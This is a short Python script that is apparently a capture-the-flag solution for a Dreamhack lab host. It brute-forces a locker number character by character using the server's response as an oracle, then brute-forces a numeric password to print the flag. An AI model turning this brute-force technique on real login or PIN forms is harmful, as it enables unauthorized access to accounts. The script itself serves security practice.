import requests, string

url = "http://host3.dreamhack.games:17017/"

alphanumeric = string.ascii_lowercase + string.digits

session = requests.Session()

locker_num = ''

for i in range(4):
  for c in alphanumeric:
    data = {
      'locker_num':locker_num+c
    }
    res = session.post(url, data=data)
    if "Good" in res.text:
      locker_num += c
      print(locker_num)
      break
    
for password in range(100,201):
  data['password'] = password
  res = session.post(url, data=data)
  if "FLAG" in res.text:
    print('Success!')
    for line in res.text.split('\n'):
      if 'DH{' in line:
        print(line.strip())
    break
